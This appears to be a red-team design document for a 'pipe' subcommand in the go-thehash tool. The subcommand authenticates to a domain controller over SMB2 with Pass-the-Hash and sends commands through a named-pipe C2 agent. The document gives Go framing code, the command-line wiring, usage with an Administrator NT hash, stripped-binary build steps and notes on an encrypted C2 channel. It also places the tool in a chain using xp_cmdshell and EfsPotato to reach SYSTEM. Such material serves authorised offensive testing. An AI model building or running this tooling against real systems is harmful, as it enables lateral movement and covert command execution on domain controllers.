# go-thehash `pipe` subcommand — Implementation Plan

Add a `pipe` subcommand to `go-thehash` that sends a command through a remote named pipe via SMB2 Pass-the-Hash and returns the output. This is the operator-side client for `smbpipe-agent.exe` running on the target.

**ATT&CK:** T1550.002 (PtH auth), T1021.002 (SMB admin share IPC$), T1071 (C2 over named pipe)

---

## Role in Phase 4

```
IIS01 (xp_cmdshell)                          DC01
go-thehash pipe DC01 ... oraclexa "whoami"
  │
  ├── PtH NTLMv2 auth ─────────────────────► SMB2 session
  ├── TreeConnect IPC$ ─────────────────────► IPC$ share
  ├── OpenFile "oraclexa" ──────────────────► \\.\pipe\oraclexa (smbpipe-agent)
  ├── WriteFile [len][cmd] ─────────────────► agent reads command
  ├── ReadFile  [len][output] ◄─────────────── agent executes, writes output
  ├── CloseFile
  └── print output to stdout
```

Used in Phase 4 Steps 3B, 4, 5, 6A, 7 — every command sent to DC01 through the pipe C2 channel goes through this subcommand.

---

## Usage

```
go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>
```

| Arg | Description | Example |
|---|---|---|
| `target` | DC01 hostname or IP | `DC01` |
| `domain` | Windows domain | `TESTLAB` |
| `user` | Username for PtH | `Administrator` |
| `nt-hash` | 32-hex NT hash | `aad3b435...` |
| `pipe-name` | Named pipe name (without `\\.\pipe\` prefix) | `oraclexa` |
| `command` | Command string to execute on target | `whoami` |

### Example

```
go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf7... oraclexa "whoami"
```

Output:
```
[+] Authenticated as TESTLAB\Administrator
nt authority\system
```

---

## Wire Protocol

Must match the agent's length-prefix framing (see [`../smbpipe-agent/`](../smbpipe-agent/)):

### Write (command)

```
[4 bytes: uint32 LE len(cmd)] [cmd bytes UTF-8]
```

### Read (output)

```
[4 bytes: uint32 LE len(output)] [output bytes UTF-8]
```

---

## Implementation

### go-smb primitives used

All already exist in the vendored `./go-smb` library:

| Primitive | Location | Purpose |
|---|---|---|
| `connect()` | `main.go:66` | PtH NTLMv2 SMB2 session (already in go-thehash) |
| `session.TreeConnect("IPC$")` | `smb/session.go:985` | Connect to IPC$ share |
| `session.OpenFile("IPC$", pipeName)` | `smb/session.go:1550` | Open remote named pipe |
| `file.WriteFile(data, 0)` | `smb/session.go:1871` | Write command to pipe |
| `file.ReadFile(buf, 0)` | `smb/session.go:1684` | Read output from pipe |

### Why not `FSCTL_PIPE_TRANSCEIVE`

The `FsctlPipeTransceive` IOCTL (`0x0011C017`) exists in go-smb but requires the pipe to be opened with `FILE_PIPE_MESSAGE_MODE` on the server side. The agent uses byte-mode with length-prefix framing, so separate `WriteFile` + `ReadFile` is correct and simpler. The IOCTL path (`file.NewIoCTLReq` → `session.WriteIoCtlReq`) is available as a fallback but not needed.

### New function: `execViaPipe`

> **Status note (post-implementation):** the shipped version differs from the sketch below —
> Stage 1 added `openPipeWithRetry` (10 ms poll on `STATUS_PIPE_BUSY`/`PIPE_NOT_AVAILABLE`, 2 s deadline)
> and Stage 2 replaced plaintext framing with the encrypted channel: a 16-byte salt handshake derives
> per-connection AES-256-GCM keys via static X25519 ECDH + HKDF (`establishChannel`), after which
> commands/responses travel as `[len][nonce][ciphertext+tag]` frames (`pipeCipher.seal/open`,
> `readEncryptedMsg`). The mirror protocol implementation lives in smbpipe-agent's
> `internal/securechan`. The original design record is kept below for context.

```go
func execViaPipe(session *smb.Connection, pipeName, command string) error {
    // 1. TreeConnect IPC$
    // 2. OpenFile IPC$ pipeName
    // 3. writeMsg: 4-byte LE length + command bytes
    // 4. readMsg:  4-byte LE length + output bytes
    // 5. print output to stdout
    // 6. CloseFile, TreeDisconnect
}
```

Estimated: ~50 lines added to `main.go`.

### Length-prefix helpers

```go
func writeMsg(f *smb.File, data []byte) error {
    header := make([]byte, 4)
    binary.LittleEndian.PutUint32(header, uint32(len(data)))
    if _, err := f.WriteFile(header, 0); err != nil {
        return err
    }
    if _, err := f.WriteFile(data, 0); err != nil {
        return err
    }
    return nil
}

// readMsg was removed once the encrypted channel landed; its replacement,
// readEncryptedMsg(f, cipher), additionally validates the frame header as
// AEAD associated data and checks the nonce counter.
```

### ReadFile offset behavior on pipes

SMB2 `ReadFile` on a named pipe ignores the `offset` parameter — data comes from the pipe buffer sequentially. The go-smb `File.ReadFile(buf, offset)` sends the offset in the SMB2 READ request, but the server ignores it for pipe handles. Passing `0` is correct.

### Case: `main.go` switch addition

```go
case "pipe":
    if len(os.Args) != 8 {
        fmt.Fprintln(os.Stderr, "Usage: go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>")
        os.Exit(1)
    }
    target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
    pipeName, command := os.Args[6], os.Args[7]

    session, err := connect(target, domain, user, hashHex)
    // ... auth print ...
    if err := execViaPipe(session, pipeName, command); err != nil {
        // ... error handling ...
    }
```

---

## Build

No new dependencies — uses the existing vendored `./go-smb` library. Same build command:

```powershell
go mod tidy
$env:GOOS = "windows"; $env:GOARCH = "amd64"
go build -ldflags="-s -w" -o go-thehash.exe .
```

---

## Changes to Existing Files

| File | Change |
|---|---|
| `main.go` | Add `case "pipe"` in the `switch`, add `execViaPipe` function, add `writeMsg`/`readMsg` helpers, update `usage()` |

No new files. No new dependencies. ~60 lines net addition to `main.go`.

---

## Validation

Test locally against a Windows host running `smbpipe-agent.exe`:

```
# Start agent on target
smbpipe-agent.exe

# From attacker (using a known local admin hash)
go-thehash.exe pipe <target-ip> . Administrator <hash> oraclexa "whoami"
# Expected: nt authority\system
```

Phase 4 integration: the `pipe` subcommand is invoked via `xpshell cmd` on IIS01 — the EfsPotato SYSTEM context spawns `go-thehash.exe pipe DC01 ...` through the xp_cmdshell channel.
